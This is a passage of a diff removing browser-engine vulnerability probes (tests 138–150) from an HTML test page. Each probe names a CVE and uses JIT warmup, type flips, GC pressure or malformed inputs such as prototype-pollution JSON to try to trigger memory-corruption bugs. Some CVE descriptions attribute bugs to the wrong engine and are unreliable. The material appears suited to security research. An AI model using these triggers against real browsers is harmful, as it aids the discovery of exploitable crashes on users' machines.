-    trySpread(0x7FFFFF);       // grande mas alocavel
-    trySpread(0x1000000);      // 16M elementos
-
-    // Spread de dois arrays cujas somas fazem overflow
-    function jitMeTwo(a, b){ return [...a, ...b]; }
-    for(let i = 0; i < 300; i++) jitMeTwo([1,2], [3,4]);
-    try {
-      const bigA = new Array(0x1000000).fill(1.1);
-      const bigB = new Array(0x1000000).fill(2.2);
-      jitMeTwo(bigA, bigB); // soma = 0x2000000, pode overflow em versoes antigas
-    } catch(e){}
-  } catch(e){}
-  log('Teste 138: fim');
-}
-
-// T139 — CVE-2019-8622: DFG doesGC() incorreto para HasIndexedProperty em StringObjects
-// HasIndexedProperty em String nao deveria triggerar GC mas doesGC() retornava true;
-// o DFG suprimia optimizacoes de forma errada causando acesso OOB
-function t139(){
-  log('Teste 139: inicio');
-  try {
-    // Criar StringObject via Object(string)
-    const strObj = Object('hello world test string abcdefghijk');
-    const str    = 'hello world test string abcdefghijk';
-
-    function hasIndex(s, i){ return i in s; }
-    function getIndex(s, i){ return s[i]; }
-
-    // Warmup com string primitiva
-    for(let i = 0; i < 0x30000; i++){
-      hasIndex(str, i % str.length);
-      getIndex(str, i % str.length);
-    }
-
-    // Agora misturar com StringObject
-    for(let i = 0; i < 0x10000; i++){
-      try { hasIndex(strObj, i % strObj.length); } catch(e){}
-      try { getIndex(strObj, i % strObj.length); } catch(e){}
-    }
-
-    // Indices fora do range da string
-    const outIdxs = [-1, str.length, str.length + 1, 0x7FFFFFFF, NaN, Infinity];
-    for(let idx of outIdxs){
-      try { hasIndex(str, idx); }    catch(e){}
-      try { hasIndex(strObj, idx); } catch(e){}
-      try { getIndex(str, idx); }    catch(e){}
-    }
-
-    // StringObject com propriedades extras que conflitem com indices
-    strObj[100] = 'extra';
-    Object.defineProperty(strObj, '5', {
-      get: function(){ return 'INJECTED'; },
-      configurable: true, enumerable: true
-    });
-    for(let i = 0; i < 1000; i++){
-      try { hasIndex(strObj, 5); }   catch(e){}
-      try { getIndex(strObj, 5); }   catch(e){}
-      try { hasIndex(strObj, 100); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 139: fim');
-}
-
-// T140 — CVE-2019-8623: LICM em DFG JIT deixa variavel de pilha nao-inicializada
-// LICM move codigo para antes do loop; variavel local que so e definida dentro
-// do loop fica sem inicializacao quando o codigo movido la referencia
-function t140(){
-  log('Teste 140: inicio');
-  try {
-    function licmUninitStack(arr, n){
-      let uninit; // sem inicializacao intencional
-      for(let i = 0; i < n; i++){
-        uninit = arr[i]; // LICM candidato se arr[i] for loop-invariant (i constante)
-        if(i === 0) uninit = uninit * 2;
-      }
-      return uninit;
-    }
-
-    const arr = new Float64Array(16);
-    for(let i = 0; i < 16; i++) arr[i] = i * 1.1;
-    for(let i = 0; i < 0x40000; i++) licmUninitStack(arr, 8);
-
-    // Agora com n=0: loop nao executa, uninit fica sem valor
-    try { let r = licmUninitStack(arr, 0); } catch(e){}
-
-    // Versao com multiplas variaveis locais candidatas a LICM
-    function multiLICM(a, b, c, n){
-      let x, y, z;
-      for(let i = 0; i < n; i++){
-        x = a + i;    // muda a cada iter — nao-invariant
-        y = b * 2;    // b nao muda — LICM candidato
-        z = c.val;    // getter — LICM pode mover se c for constante
-      }
-      return (x || 0) + (y || 0) + (z || 0);
-    }
-    const cObj = { val: 99 };
-    for(let i = 0; i < 0x30000; i++) multiLICM(1, 2, cObj, 10);
-
-    // Mudar c.val para getter que retorna tipo diferente
-    Object.defineProperty(cObj, 'val', {
-      get: function(){ return { data: new Uint32Array(4) }; },
-      configurable: true
-    });
-    try { multiLICM(1, 2, cObj, 10); } catch(e){}
-    try { multiLICM(1, 2, cObj, 0); }  catch(e){}
-  } catch(e){}
-  log('Teste 140: fim');
-}
-
-// T141 — CVE-2025-43213: tipagem invalida de NewRegExpUntyped
-// NewRegExpUntyped: DFG nao tipa corretamente o resultado;
-// o objeto pode ser tratado como tipo errado em operacoes subsequentes
-function t141(){
-  log('Teste 141: inicio');
-  try {
-    function makeRe(pattern, flags){
-      return new RegExp(pattern, flags); // NewRegExpUntyped no DFG
-    }
-    // Warmup — JIT compila makeRe
-    for(let i = 0; i < 0x20000; i++) makeRe('\\w+', 'g');
-
-    // Variar pattern e flags para explorar tipagem invalida
-    const patterns = [
-      ['\\w+', 'g'], ['\\d+', 'i'], ['.', 'gim'],
-      ['(?<name>\\w+)', 'g'], // grupo nomeado
-      ['(a+)+', ''],           // backtracking
-      ['[\\s\\S]*', 'g'],
-      ['(?:)', 'gimsuy'],      // todas as flags
-    ];
-    for(let [p, f] of patterns){
-      try {
-        let re = makeRe(p, f);
-        // Usar o regex de forma que o tipo incorreto cause problema
-        let r = re.exec('test string hello world');
-        if(r) r[0].toUpperCase();
-        re.test('another test');
-        re[Symbol.replace]('hello world', 'X');
-      } catch(e){}
-    }
-
-    // Criar regex dentro de funcao JIT com flag que muda
-    let flagToggle = 'g';
-    function dynamicRe(){
-      return new RegExp('\\w+', flagToggle);
-    }
-    for(let i = 0; i < 0x20000; i++) dynamicRe();
-    flagToggle = 'gimsuy';
-    for(let i = 0; i < 1000; i++){
-      try { dynamicRe().exec('test'); } catch(e){}
-    }
-    flagToggle = 'invalid_flag';
-    try { dynamicRe(); } catch(e){}
-  } catch(e){}
-  log('Teste 141: fim');
-}
-
-// T142 — CVE-2025-1934: GC inesperado durante processamento de bailout de RegExp
-// RegExp bailout triggera GC; GC pode coletar objetos que o bailout ainda referencia
-function t142(){
-  log('Teste 142: inicio');
-  try {
-    const re = /(\w+)(\s+)(\w+)/g;
-
-    function runRegex(s){
-      let results = [];
-      let m;
-      re.lastIndex = 0;
-      while((m = re.exec(s)) !== null){
-        results.push(m[0]);
-        if(results.length > 20) break; // limite de seguranca
-      }
-      return results;
-    }
-
-    const testStr = 'hello world foo bar baz qux';
-    for(let i = 0; i < 0x20000; i++) runRegex(testStr);
-
-    // Triggerar GC durante o exec via pressure de alocacao
-    function gcDuringExec(s){
-      let results = [];
-      re.lastIndex = 0;
-      let m;
-      while((m = re.exec(s)) !== null){
-        results.push(m[0]);
-        // GC pressure dentro do loop de regex
-        let pressure = new Array(1000).fill(null).map(function(){
-          return { x: Math.random() };
-        });
-        pressure = null;
-        if(results.length > 10) break;
-      }
-      return results;
-    }
-    for(let i = 0; i < 100; i++){
-      try { gcDuringExec(testStr); } catch(e){}
-    }
-
-    // Bailout de regex: regex com backtracking que pode ser abortado
-    const reBT = /^(a+)+$/;
-    for(let i = 0; i < 0x10000; i++) reBT.test('aaa');
-    // String que forca bailout do regex JIT
-    try { reBT.test('aaaaaaaaaaaaaaaaaaaaaaac'); } catch(e){}
-
-    // Regex com Unicode e flag u: pode ter caminhos de bailout diferentes
-    const reU = /\p{L}+/gu;
-    for(let i = 0; i < 0x10000; i++){ reU.lastIndex = 0; reU.exec('hello'); }
-    try {
-      const bigStr = 'hello '.repeat(1000);
-      reU.lastIndex = 0;
-      while(reU.exec(bigStr) !== null && reU.lastIndex < 100){}
-    } catch(e){}
-  } catch(e){}
-  log('Teste 142: fim');
-}
-
-// T143 — CVE-2025-0241: corrupacao de memoria com Text Segmentation (Intl.Segmenter)
-// Intl.Segmenter pode ter corrupacao ao segmentar strings com caracteres especiais
-function t143(){
-  log('Teste 143: inicio');
-  try {
-    if(typeof Intl.Segmenter === 'undefined') throw new Error('sem Intl.Segmenter');
-
-    const segWord = new Intl.Segmenter('pt-BR', { granularity: 'word' });
-    const segChar = new Intl.Segmenter('ja', { granularity: 'grapheme' });
-    const segSent = new Intl.Segmenter('en', { granularity: 'sentence' });
-
-    // Strings que podem causar problemas na segmentacao
-    const testStrs = [
-      'Hello world! Como vai? Fine.',
-      '\uD800\uDC00',                    // par substituto valido
-      '\uD800',                          // substituto alto isolado
-      '\uDC00',                          // substituto baixo isolado
-      '\u0000\u0001\u0002',              // caracteres de controle
-      '\u200B\u200C\u200D\uFEFF',        // zero-width e BOM
-      '\u{1F600}\u{1F601}\u{1F602}',     // emojis (pares substitutos)
-      'a'.repeat(10000),                  // string longa
-      '\r\n\r\n'.repeat(100),            // CRLFs
-      '\u3041\u3042\u3043',              // hiragana
-      '\u00E9\u00E0\u00FC',              // letras acentuadas (NFC)
-      '\u0065\u0301',                    // 'e' + combining accent (NFD)
-    ];
-
-    for(let s of testStrs){
-      try {
-        let segs = [...segWord.segment(s)];
-        let chars = [...segChar.segment(s)];
-        let sents = [...segSent.segment(s)];
-      } catch(e){}
-    }
-
-    // Stress: segmentar em loop com GC pressure
-    for(let i = 0; i < 1000; i++){
-      try {
-        let s = 'word' + i + ' test sentence. Another one!';
-        [...segWord.segment(s)];
-        let pressure = new Array(100).fill(null).map(function(){ return {}; });
-        pressure = null;
-      } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 143: fim');
-}
-
-// T144 — CVE-2025-0240: mismatch de compartimento ao parsear JSON module
-// JSON.parse pode ter comportamento inesperado com caracteres de escape especiais
-// e objetos com propriedades que interagem com o motor
-function t144(){
-  log('Teste 144: inicio');
-  try {
-    // Strings JSON com casos de borda
-    const jsonCases = [
-      '{"__proto__":{"polluted":true}}',
-      '{"constructor":{"prototype":{"evil":true}}}',
-      '{"a":1,"__proto__":{"b":2},"c":3}',
-      '[1,[2,[3,[4,[5,[6,[7,[8,[9,[10]]]]]]]]]]',  // aninhamento profundo
-      '{"\\u0000":"null_key"}',       // chave com null byte
-      '{"\\uD800":"lone_surrogate"}', // substituto isolado
-      '{"x":' + '1,'.repeat(1000) + '"last":1}', // objeto grande
-      JSON.stringify(new Array(1000).fill(0)),
-      '{"a":{"b":{"c":{"d":{"e":{"f":{"g":"deep"}}}}}}}',
-    ];
-
-    for(let json of jsonCases){
-      try {
-        let parsed = JSON.parse(json);
-        // Verificar se propriedades do proto foram poluidas
-        let probe = {};
-        let r = JSON.stringify(parsed);
-      } catch(e){}
-    }
-
-    // JSON.parse com revisor que faz operacoes complexas
-    function revisor(key, value){
-      if(typeof value === 'number') return { num: value, arr: new Uint32Array(4) };
-      return value;
-    }
-    try {
-      JSON.parse('{"a":1,"b":2,"c":3,"d":4,"e":5}', revisor);
-    } catch(e){}
-
-    // JSON.stringify com toJSON que se referencia circularmente
-    const selfRef = { x: 1 };
-    selfRef.toJSON = function(){ return { val: 42, ref: selfRef }; };
-    try { JSON.stringify(selfRef); } catch(e){}
-  } catch(e){}
-  log('Teste 144: fim');
-}
-
-// T145 — CVE-2022-46700: Intl.Locale.prototype.hourCycles vaza JSValue vazio
-// Acesso a .hourCycles em um Intl.Locale pode retornar um JSValue interno
-// (0x0) que quando exposto ao JS causa comportamento indefinido
-function t145(){
-  log('Teste 145: inicio');
-  try {
-    if(typeof Intl.Locale === 'undefined') throw new Error('sem Intl.Locale');
-
-    const locales = [
-      'en-US', 'ja-JP', 'ar-SA', 'zh-CN', 'pt-BR',
-      'en-u-hc-h12', 'en-u-hc-h23', 'en-u-hc-h24', 'en-u-hc-h11',
-      'en-US-u-ca-gregory', 'ja-JP-u-ca-japanese',
-      'und', 'und-Latn', 'und-u-hc-h12',
-    ];
-
-    for(let loc of locales){
-      try {
-        const l = new Intl.Locale(loc);
-        // Propriedades que podem vazar JSValue interno
-        let hc   = l.hourCycles;         // CVE-2022-46700: retorna JSValue 0x0
-        let cals = l.calendars;
-        let cols = l.collations;
-        let nums = l.numberingSystems;
-        let ts   = l.textInfo;
-        let wends = l.weekInfo;
-
-        // Tentar usar o valor retornado
-        if(hc !== undefined){
-          try { hc.length; }            catch(e2){}
-          try { [...(hc||[])]; }        catch(e2){}
-          try { hc[0].toUpperCase(); }  catch(e2){}
-        }
-      } catch(e){}
-    }
-
-    // Minimize com Intl.Locale options extremos
-    try {
-      const l = new Intl.Locale('en', {
-        hourCycle: 'h12', calendar: 'gregory',
-        numberingSystem: 'latn', collation: 'standard'
-      });
-      let hc2 = l.hourCycle;
-      let hcs = l.hourCycles;
-    } catch(e){}
-  } catch(e){}
-  log('Teste 145: fim');
-}
-
-// T146 — CVE-2024-9396: corrupacao de memoria ao clonar certos objetos
-// structuredClone / postMessage com objetos que tem internal slots especiais
-// pode causar corrupacao ao clonar (ex: Map, Set, Date, RegExp aninhados)
-function t146(){
-  log('Teste 146: inicio');
-  try {
-    // Objetos com internal slots que podem causar corrupacao no clone
-    const complexObjs = [
-      new Map([[1, 2], [3, 4], [{x:1}, {y:2}]]),
-      new Set([1, 'two', {three: 3}, new Map()]),
-      new Date(NaN),
-      new Date(8640000000000000 + 1), // invalido
-      /(?<name>\w+)/gims,
-      new Error('test', { cause: new RangeError('inner') }),
-      new Map([[new Set([1,2]), new Map([[3, new Set([4,5])]])]]), // aninhado
-    ];
-
-    for(let obj of complexObjs){
-      try { structuredClone(obj); } catch(e){}
-    }
-
-    // Clone de objeto com Transferable aninhado em Map/Set
-    try {
-      const buf = new ArrayBuffer(64);
-      const m = new Map([[1, buf], [2, new Uint8Array(buf)]]);
-      // nao pode transferir buf que esta em um Map — deve lancar
-      postMessage({ m }, '*', [buf]);
-    } catch(e){}
-
-    // Clone profundo de Map/Set ciclicos
-    try {
-      const m1 = new Map();
-      const m2 = new Map();
-      m1.set('other', m2);
-      m2.set('other', m1); // ciclo entre Maps
-      structuredClone(m1);
-    } catch(e){}
-
-    // Clone de ImageData / outros objetos com internal buffers
-    try {
-      if(typeof ImageData !== 'undefined'){
-        const id = new ImageData(new Uint8ClampedArray(400), 10, 10);
-        structuredClone(id);
-      }
-    } catch(e){}
-  } catch(e){}
-  log('Teste 146: fim');
-}
-
-// T147 — CVE-2021-30851: lock ausente durante lookup concorrente em HashTable
-// JSC tem lock para acesso concorrente ao HashTable de strings;
-// race entre thread de compilacao JIT e thread JS pode causar acesso sem lock
-function t147(){
-  log('Teste 147: inicio');
-  try {
-    // Simular pressao no HashTable de identificadores via muitas strings unicas
-    // que o JIT precisa internar durante compilacao
-    function makeIds(n){
-      const ids = [];
-      for(let i = 0; i < n; i++){
-        ids.push('prop_' + i + '_' + Math.random().toString(36).slice(2));
-      }
-      return ids;
-    }
-
-    // Criar objeto com muitas propriedades (interna ao HashTable de PropertyTable)
-    const obj = {};
-    const ids = makeIds(2000);
-    for(let id of ids) obj[id] = Math.random();
-
-    // Funcao JIT que faz get em muitas propriedades — internamento durante compilacao
-    function massGet(o, keys){
-      let sum = 0;
-      for(let k of keys) sum += (o[k] || 0);
-      return sum;
-    }
-    for(let i = 0; i < 0x10000; i++) massGet(obj, ids.slice(0, 50));
-
-    // Adicionar/remover propriedades durante execucao JIT
-    async function concurrentModify(){
-      for(let i = 0; i < 100; i++){
-        obj['dynamic_' + i] = i;
-        await Promise.resolve();
-        delete obj['dynamic_' + i];
-        await Promise.resolve();
-        massGet(obj, ids.slice(0, 20));
-      }
-    }
-    concurrentModify().catch(function(){});
-
-    // Stress de internamento de strings via Symbol.for (usa HashTable global)
-    for(let i = 0; i < 5000; i++){
-      try { Symbol.for('unique_sym_' + i); } catch(e){}
-    }
-    // Verificar que symbols internados ainda existem
-    for(let i = 0; i < 100; i++){
-      try { Symbol.for('unique_sym_' + i); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 147: fim');
-}
-
-// T148 — CVE-2025-43214: corrupacao de memoria durante JSToWasmEntry ao iterar a pilha
-// Sem WebAssembly disponivel, testar caminhos alternativos que usam a mesma infra:
-// stack walking durante GC + profundidade de chamada JIT + OSR
-function t148(){
-  log('Teste 148: inicio');
-  try {
-    // Funcao recursiva que cria frame profundo — GC durante recursao anda a pilha
-    function deepRecurse(n, arr){
-      if(n <= 0){
-        // GC pressure no ponto mais fundo da pilha
-        let trash = new Array(10000).fill(null).map(function(){
-          return { x: new Uint32Array(8) };
-        });
-        trash = null;
-        return arr.length;
-      }
-      arr.push({ level: n, buf: new Uint8Array(4) });
-      return deepRecurse(n - 1, arr);
-    }
-    try { deepRecurse(500, []); } catch(e){}
-
-    // Funcao JIT que chama callback que forca GC — stack walker ve frame JIT
-    function jitCaller(fn, n){
-      let sum = 0;
-      for(let i = 0; i < n; i++) sum += fn(i);
-      return sum;
-    }
-    let gcCount = 0;
-    function gcCallback(i){
-      gcCount++;
-      if(gcCount % 1000 === 0){
-        let trash = new Array(50000).fill(null).map(function(){ return {}; });
-        trash = null;
-      }
-      return i * 1.5;
-    }
-    // Warmup sem GC
-    for(let i = 0; i < 0x10000; i++) jitCaller(function(x){ return x * 1.5; }, 10);
-    // Com GC no callback
-    try { jitCaller(gcCallback, 5000); } catch(e){}
-  } catch(e){}
-  log('Teste 148: fim');
-}
-
-// T149 — CVE-2025-1012: use-after-free durante delazification concorrente
-// JSC pode compilar funcoes lazily em uma thread separada;
-// se a funcao e modificada (via eval ou redef) enquanto compila, UAF pode ocorrer
-function t149(){
-  log('Teste 149: inicio');
-  try {
-    // Criar muitas funcoes que serao compiladas lazily
-    const fns = [];
-    for(let i = 0; i < 200; i++){
-      fns.push(new Function('x', 'return x * ' + i + ' + ' + (i * 2) + ';'));
-    }
-
-    // Chamar todas para triggerar compilacao
-    for(let j = 0; j < 100; j++){
-      for(let fn of fns){
-        try { fn(j); } catch(e){}
-      }
-    }
-
-    // Redefinir funcoes enquanto outras podem estar sendo compiladas
-    async function redefConcurrent(){
-      for(let i = 0; i < 50; i++){
-        fns[i % fns.length] = new Function('x', 'return x + ' + i + ';');
-        await Promise.resolve();
-        // Chamar funcoes que podem estar sendo recompiladas
-        for(let fn of fns.slice(0, 10)){
-          try { fn(i); } catch(e){}
-        }
-      }
-    }
-    redefConcurrent().catch(function(){});
-
-    // eval que redefine funcoes de closure durante execucao
-    function makeClosureFn(n){
-      let x = n;
-      return function(){ return eval('x * 2 + ' + n); };
-    }
-    const closureFns = [];
-    for(let i = 0; i < 100; i++) closureFns.push(makeClosureFn(i));
-    for(let j = 0; j < 100; j++){
-      for(let fn of closureFns){
-        try { fn(); } catch(e){}
-      }
-    }
-  } catch(e){}
-  log('Teste 149: fim');
-}
-
-// T150 — Combinacao: Phi escape + LICM + IC invalido + GC (multi-CVE stress)
-// Combinar os vetores mais promissores em uma unica funcao que stressas
-// simultaneamente os caminhos de ObjectAllocationSinkingPhase, LICM e IC
-function t150(){
-  log('Teste 150: inicio');
-  try {
-    'use strict';
-    let sinkA = null;
-    let sinkB = null;
-
-    function makeObjA(v){ const o = { x: v, y: v+1 }; return o; }
-    function makeObjB(v){ const o = { x: v*2, z: v+3 }; return o; } // estrutura diferente!
-
-    function combined(flip, gcFlip, typeFlip){
-      let acc = 0;
-      let cached = makeObjA(0); // LICM candidato se JIT ver como loop-invariant
-
-      for(let i = 0; i < 200; i++){
-        // Phi de dois tipos com estruturas diferentes (Phi escape bug)
-        const obj = (i & 1) ? makeObjA(i) : makeObjB(i);
-        sinkA = obj;
-
-        // Acesso que LICM pode tentar mover (obj.x muda a cada iter pois obj muda)
-        acc += obj.x;
-
-        // GC pressure a cada 50 iters
-        if(gcFlip && i % 50 === 0){
-          let trash = new Array(10000).fill(null).map(function(){ return {}; });
-          trash = null;
-        }
-
-        // OSR exit trigger por type flip
-        if(flip && i === 150){
-          acc = { v: acc }; // Int32 -> Object: forca OSR exit
-        }
-        if(typeFlip && i === 100){
-          cached = makeObjB(i); // muda estrutura do LICM candidato
-        }
-
-        sinkB = cached;
-      }
-
-      // Pos-loop: acessar objetos que podem ter sido sinkados/freed
-      try {
-        let rx = sinkA.x;
-        let ry = sinkB.x;
-        let rz = sinkA.y || sinkA.z || 0;
-      } catch(e){}
-
-      return acc;
-    }
-
-    // Warmup: sem flips
-    for(let i = 0; i < 100000; i++) combined(false, false, false);
-
-    // Pos-FTL: ativar cada flip individualmente e em combinacao
-    try { combined(true,  false, false); } catch(e){}
-    try { combined(false, true,  false); } catch(e){}
-    try { combined(false, false, true);  } catch(e){}
-    try { combined(true,  true,  false); } catch(e){}
-    try { combined(true,  false, true);  } catch(e){}
-    try { combined(false, true,  true);  } catch(e){}
-    try { combined(true,  true,  true);  } catch(e){}
-  } catch(e){}
-  log('Teste 150: fim');
-}
+  }, 500);
+});
 </script>
 </body>
 </html>
